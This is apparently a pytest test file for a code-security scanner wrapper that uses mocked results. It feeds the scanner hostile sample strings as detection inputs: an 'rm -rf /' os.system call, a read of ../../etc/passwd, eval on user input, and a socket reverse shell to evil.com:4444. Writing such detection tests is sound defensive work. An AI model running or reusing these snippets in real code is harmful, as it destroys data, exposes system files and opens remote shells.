from unittest.mock import MagicMock, patch

import pytest

from app import codeshield
from app.models import ScanResult


@pytest.fixture(autouse=True)
def _reset_codeshield():
    """Reset codeshield state between tests."""
    codeshield._scanner = None
    codeshield._loaded = False
    yield
    codeshield._scanner = None
    codeshield._loaded = False


class TestCodeShieldScan:
    def test_not_loaded_returns_clean(self):
        """When not loaded, scan returns clean result (graceful degradation)."""
        result = codeshield.scan("import os\nos.system('rm -rf /')")
        assert isinstance(result, ScanResult)
        assert result.found is False
        assert result.scanner_name == "codeshield"

    def test_clean_code_passes(self):
        """Clean Python code should not be flagged."""
        mock_scanner = MagicMock()
        mock_result = MagicMock()
        mock_result.is_insecure = False
        mock_scanner.scan.return_value = mock_result

        codeshield._scanner = mock_scanner
        codeshield._loaded = True

        result = codeshield.scan("def hello():\n    return 'world'")
        assert result.found is False

    def test_os_system_detected(self):
        """os.system() should be flagged as insecure."""
        mock_scanner = MagicMock()
        mock_result = MagicMock()
        mock_result.is_insecure = True
        mock_issue = MagicMock()
        mock_issue.rule = "os_system"
        mock_issue.description = "Dangerous os.system call"
        mock_issue.line = 2
        mock_result.issues = [mock_issue]
        mock_scanner.scan.return_value = mock_result

        codeshield._scanner = mock_scanner
        codeshield._loaded = True

        result = codeshield.scan("import os\nos.system('rm -rf /')")
        assert result.found is True
        assert len(result.matches) == 1
        assert "os_system" in result.matches[0].pattern_name

    def test_path_traversal_detected(self):
        """Path traversal code should be flagged."""
        mock_scanner = MagicMock()
        mock_result = MagicMock()
        mock_result.is_insecure = True
        mock_issue = MagicMock()
        mock_issue.rule = "path_traversal"
        mock_issue.description = "Path traversal attempt"
        mock_issue.line = 1
        mock_result.issues = [mock_issue]
        mock_scanner.scan.return_value = mock_result

        codeshield._scanner = mock_scanner
        codeshield._loaded = True

        result = codeshield.scan("open('../../etc/passwd')")
        assert result.found is True

    def test_eval_exec_detected(self):
        """eval/exec should be flagged."""
        mock_scanner = MagicMock()
        mock_result = MagicMock()
        mock_result.is_insecure = True
        mock_issue = MagicMock()
        mock_issue.rule = "code_injection"
        mock_issue.description = "eval() detected"
        mock_issue.line = 1
        mock_result.issues = [mock_issue]
        mock_scanner.scan.return_value = mock_result

        codeshield._scanner = mock_scanner
        codeshield._loaded = True

        result = codeshield.scan("eval(user_input)")
        assert result.found is True

    def test_reverse_shell_blocked(self):
        """Reverse shell code should be flagged."""
        mock_scanner = MagicMock()
        mock_result = MagicMock()
        mock_result.is_insecure = True
        mock_issue = MagicMock()
        mock_issue.rule = "reverse_shell"
        mock_issue.description = "Reverse shell detected"
        mock_issue.line = 3
        mock_result.issues = [mock_issue]
        mock_scanner.scan.return_value = mock_result

        codeshield._scanner = mock_scanner
        codeshield._loaded = True

        code = "import socket\ns=socket.socket()\ns.connect(('evil.com',4444))"
        result = codeshield.scan(code)
        assert result.found is True

    def test_is_loaded_false_by_default(self):
        assert codeshield.is_loaded() is False

    def test_insecure_no_issues_generic_match(self):
        """If is_insecure=True but no issues list, adds a generic match."""
        mock_scanner = MagicMock()
        mock_result = MagicMock()
        mock_result.is_insecure = True
        mock_result.issues = []  # empty issues
        mock_scanner.scan.return_value = mock_result

        codeshield._scanner = mock_scanner
        codeshield._loaded = True

        result = codeshield.scan("dangerous code")
        assert result.found is True
        assert result.matches[0].pattern_name == "codeshield_insecure"

    def test_scan_error_returns_clean(self):
        """If the scanner throws, return clean (fail-open for availability)."""
        mock_scanner = MagicMock()
        mock_scanner.scan.side_effect = RuntimeError("Scanner crashed")

        codeshield._scanner = mock_scanner
        codeshield._loaded = True

        result = codeshield.scan("some code")
        assert result.found is False


class TestCodeShieldInitialize:
    def test_import_not_available(self):
        """When llamafirewall is not installed, returns False gracefully."""
        import sys
        # Temporarily make llamafirewall unimportable
        with patch.dict(sys.modules, {"llamafirewall": None}):
            result = codeshield.initialize()
            assert result is False
            assert codeshield.is_loaded() is False
